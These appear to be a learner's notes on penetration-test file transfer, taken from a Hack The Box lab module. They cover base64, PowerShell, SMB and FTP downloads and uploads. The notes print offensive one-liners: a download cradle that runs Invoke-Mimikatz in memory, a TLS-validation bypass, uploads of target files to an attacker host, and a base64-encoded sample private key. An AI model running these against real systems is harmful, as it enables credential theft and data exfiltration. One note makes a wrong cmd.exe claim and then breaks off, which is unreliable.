There are many situations when transferring files to or from a target system is necessary. Image the following scenario:
> [!Note] **Setting the Stage**
>
>During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool. We then try to use [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.

Understanding different ways to perform file transfers and how networks operate can help accomplish goals during an assessment. It's important to be aware of host ctrls that may prevent these actions, e.g. whitelisting or AV/EDR blocking specific apps or activities. File transfers are also affected by net devices such as fw, IDS, or IPS which can monitor or block particular ports or uncommon operations.
File transfer is a core feature of any OS, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent admins, and it is worth reviewing a range of techniques that may be possible in a given env.
This module covers these techniques that leverage tools and apps commonly avail on Win and Linux sys's. This is not an exhaustive list. The info w/i this module can also be used as a reference guide when working through other HtB Academy modules, as many of the in-module exercises will req students to transfer files to/from a target host or to/from the provided Pwnbox. Target Win and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment w as many of the techniques demo'd in the module sectioned as possible. Observe the nuances b/w the diff transfer methods and note down situations where they would be helpful. Once completing this module, try out the various techniques in other HtB Academy modules and boxes and labs on the HtB main platform.
# File Transfer Methods
## Windows File Transfer Methods
### Introduction
The Win OS has evolved o/ the past few years, and new versions come w diff utils for file transfer operations. Understanding file transfer in Windows can help both atkrs and defenders. Atkrs can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. The [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) blog post is an example of an advanced persistent threat (APT).
The blog post starts by talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a sys to execute an atk. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the sys but runs in memory.
The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) w the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).
All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the atk. [Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png) ![[Pasted image 20240528120232.png]]
This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.
This section will discuss using some native Windows tools for download and upload operations. Later, this module will discuss `Living Off the Land` binaries on Windows and Linux and how to use them to perform file transfer operations.
### Download Operations
Suppose you have access to the machine `MS02`, and you need to download a file from your `Pwnbox` machine.
![[Pasted image 20240528121327.png]]
### PowerShell Base64 Encode & Decode
Depending on the file size we want to transfer, it is possible to use diff methods that do not req net comms. If terminal access is needed, encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.
An essential step in using this method is to ensure the file you encode and decode is correct. We can use[md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calcs and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. The following cmd attempts to transfer a sample ssh key:
```pwnbox-check-ssh-key-md5-hash
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
```pwnbox-encode-ssh-key-to-base64
$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```
Then copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```confirming-md5-hashes-match
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
>[!Important Note]
>After trying this command in the Windows cmd.exe, it turns out that [IO.File]::.......etc is not actually a command. Like at all. The double colon comments everything out after it. The proper command for cmd.exe is the following:

Finally, confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5dum` does.
```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
> [!Note] Important Note
> While this method is convenient, it's not always possible to use. Windows Cmd Line util (cmd.exe) has a max string length of 8,191 chars. Also, a web shell may err if you attempt to send extremely large strings.
#### PowerShell Web Downloads
Most companies allow `HTTP` and `HTTPS` outbound traf through the fw to allow employee productivity. Leveraging these transportation methods for file transfer operations is v convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like `.exe`), or only allow access to a list of whitelisted domains in more restricted networks.
PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS`, or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
#### PowerShell DownloadFile Method
The following cmd specifies the class name `Net.WebClient` and the `DownloadFile` method w the parameters corresponding to the URL of the target file to download and the output file name.
```file-download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
#### PowerShell DownloadString - Fileless Method
As previously discussed, fileless atks work by using some OS functions to download the payload and execute it directly. PowerShell can also be used to perform fileless atks. Instead of downloading a PowerShell script to disk, use the following cmd to run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
`PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
`IEX` also accepts pipeline input:
`PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
#### PowerShell Invoke-WebRequests
From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also avail, but is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name:
`PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity w them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.
#### Common Erroes with PowerShell
There may be cases when the Internet Explorer first-launch config has not been completed, which prevents the download.![[Pasted image 20240528132656.png]]This can be bypassed using the parameter `-UseBasicParsing`:
```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the cert is not trusted, which can be bypassed w the following cmd:
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables apps and users to transfer files to and from remote servers.
SMB can be used to download files form your machine easily by creating an SMB server in your machine w [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move,` PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
```create-the-smb-server
$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
To download a file from the SMB server to the current working directory, use the following cmd:
```copy-file-from-smb-server
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
New versions of WIndows block unauth guest access, as the following cmd shows:
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
One method to transfer files in this scenario is by setting a username and passwd using your Impacket SMB server and mount the SMB server on the target Windows machine:
```create-smb-server-with-username-passwd
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```mount-smb-server
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```
> [!Note]
> It is also possible to mount the SMB server if an error is received when using the `copy filename \\IP\sharename` cmd.
### FTP Downloads
Another way to transfer files is using the `File Transfer Protocol` (`FTP`), which uses port TCP/21 and TCP/20. Use the FTP client or POwerShell `Net.WebClient` to download files from an FTP server.
Config an FTP server in the atk host using Python3 `pyftpdlib` module, which cmd be installed with the following cmd:
`$ sudo pip3 install pyftpdlib`
`pyftpdlib` default to port 2121, so you then have to config it to use port 21. Anonymous auth is enabled by default if a username and passwd is not set:
```setting-up-python3-ftp-server
$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
After the FTP server is set up, perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.
`PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
After getting a shell on a remote machine, that shell may not be interactive. In this case, create an FTP cmd file to download a file. First, create a file containing the desired cmds and then use the FTP client to use that file to download that file.
```creating-cmd-file
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
### Upload Operations
There are also situations (e.g. passwd cracking, analysis, exfiltration, etc.) where it is important to upload files from a target machine into the atk host. The methods explained above can be used in reverse to accomplish this as explained in the following section:
#### PowerShell Base64 Encode and Decode
Now time to reverse everything explained above.
```encode-file-w-powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
Take this content and paste it into your atk host, use the `base64` cmd to decode it, and use the `md5sum` app to confirm the transfer happened correctly.
```decode-base64-string-in-linux
$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```
#### PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but the `Invoke-WebRequest` or `Invoke-RestMethod` cmds can be used to build your own upload function, given that you also have a web server that accepts uploads, which is not a default option in most common webserver utils.
For your web server, you can use [uploadserver](https://github.com/Densaugeo/uploadserver), which is an extended module of the Python [HTTP.server](https://docs.python.org/3/library/http.server.html) module, that includes a file upload page. The following cmds install, and starts the webserver:
```install-config-webserver-w-upload
$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
```start-webserver
$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now it is possible to use a PowerShell script (such as [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod`) to perform the upload operations. The `PSUpload.ps1` script accepts two parametes `-File`, which is used to specify the file path, and `-Uri`, the server URL where the file will be uploaded.
```powershell-script-upload-file
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
#### PowerShell Base64 Web Upload
Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together w Netcat, which is used to listen in on a specified port and send the file as a `POST` request. Finally, copy the output and use the base64 decode function to convert the base64 string into a file.
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
The base64 data is caught w Netcat and the base64 app is used w the decode option to convert the string to a file.
```shell-session
$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...

$ echo <base64> | base64 -d -w 0 > hosts
```
### SMB Uploads
